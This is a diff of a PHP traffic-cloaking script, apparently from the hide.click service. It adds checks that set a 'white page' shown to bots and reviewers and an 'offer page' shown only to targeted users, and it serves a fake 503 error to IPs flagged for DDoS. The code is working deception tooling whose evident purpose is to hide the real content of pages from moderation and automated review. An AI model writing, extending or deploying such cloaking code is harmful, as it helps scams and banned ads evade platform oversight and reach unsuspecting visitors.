-                if(preg_match("#(^|[^0-9a-f:])$ip#",$val)) {
+                if (preg_match("#(^|[^0-9a-f:])$ip#", $val)) {
                     // if IP were used for DDOS, emulate server unavalable error.
                     // warning: it's permanent ban! we will not knowing when ddos is over!
                     header("HTTP/1.1 503 Service Unavailable", true, 503);
@@ -396,7 +425,7 @@ function apiRequest($ip, $port, $HCSET, $HCSETdata)
     if (!empty($HCSET['O_PIXELS'])) $url .= '&O_PIXELS=' . $HCSET['O_PIXELS'];
     if (!empty($HCSET['DISABLE_CACHE'])) $url .= '&cache=' . $HCSET['DISABLE_CACHE'];
     if (!empty($HCSET['mlSet'])) $url .= '&mlSet=' . $HCSET['mlSet'];
-    if (!empty($HCSET['JS_CODE'])) $url .= '&white=' . crc32($HCSET['JS_CODE']);
+    if (!empty($HCSET['WHITE_PAGE'])) $url .= '&white=' . urlencode($HCSET['WHITE_PAGE']);
     if (!empty($HCSET['OFFER_PAGE'])) $url .= '&offer=' . urlencode($HCSET['OFFER_PAGE']);
     if (!empty($HCSET['DELAY_START'])) $url .= '&delay=' . urlencode($HCSET['DELAY_START']);
     if (!empty($HCSET['DELAY_PERMANENT'])) $url .= '&perm=' . urlencode($HCSET['DELAY_PERMANENT']);
@@ -521,6 +550,28 @@ function self_test_request($HCSET) {
         $errors[] = 'Change the OFFER_PAGE value in line <b>#' . inlineEditor("\$HCSET['OFFER_PAGE']") . '</b> to the page that will be displayed to targeted users <img src="https://hide.click/gif/black.gif" border="1">';
     }
     else $notes[] = '<a target="_blank" href="?hctest=offer">Click here to check the OFFER_PAGE</a>.';
+
+    // White check
+    if (is_file($HCSET['WHITE_PAGE'])) {
+        if (($HCSET['WHITE_PAGE'] == 'index.htm' || $HCSET['WHITE_PAGE'] == 'index.html' || $HCSET['WHITE_PAGE'] == 'index.php' || $HCSET['WHITE_PAGE'] == './index.htm' || $HCSET['WHITE_PAGE'] == './index.html' || $HCSET['WHITE_PAGE'] == './index.php') &&
+            stristr($_SERVER['SCRIPT_NAME'],'index.php')) {
+            $warnings[] = 'When index.html and index.php exist in the same folder, the server may prioritize one over the other, leading to unexpected behavior! Rename script to prevent traffic loss.';
+        }
+        else $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>';
+    }
+    else if (strstr($HCSET['WHITE_PAGE'], '://')) {
+        $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>. We recommend to use local copy for faster loading and server resilience.';
+    }
+    else if (preg_match('#^/#',$HCSET['WHITE_PAGE']) && is_file('.'.$HCSET['WHITE_PAGE'])) {
+        $errors[] = 'Invalid WHITE_PAGE file path. Try to add a dot like <b>'.'.'.$HCSET['WHITE_PAGE'].'</b> in line<b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b>';
+    }
+    else if (preg_match('#[.][a-zA-Z]#',$HCSET['WHITE_PAGE']) && preg_match('#[.][^hp/]#',$HCSET['WHITE_PAGE'])) {
+        $errors[] = 'File not found. If you are using an external site - add <b>https://</b> before the domain name. Fix the WHITE_PAGE value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b> <img src="https://hide.click/gif/white.gif" border="1">';
+    }
+    else if ($HCSET['PASSIVE'] !== true) {
+        $errors[] = 'Change the WHITE_PAGE value in line <b>#' . inlineEditor("\$HCSET['WHITE_PAGE']") . '</b> to the page that will be displayed to bots <img src="https://hide.click/gif/white.gif" border="1">';
+    }
+    else $notes[] = '<a target="_blank" href="?hctest=white">click here to check the WHITE_PAGE</a>';
 
     // Domain check
     if(empty($_SERVER["HTTP_HOST"]) || !preg_match('#\.[a-z]+$#',$_SERVER["HTTP_HOST"])) $errors[] = 'for best results, we strongly recommend that you link domain with an SSL certificate to the server.';
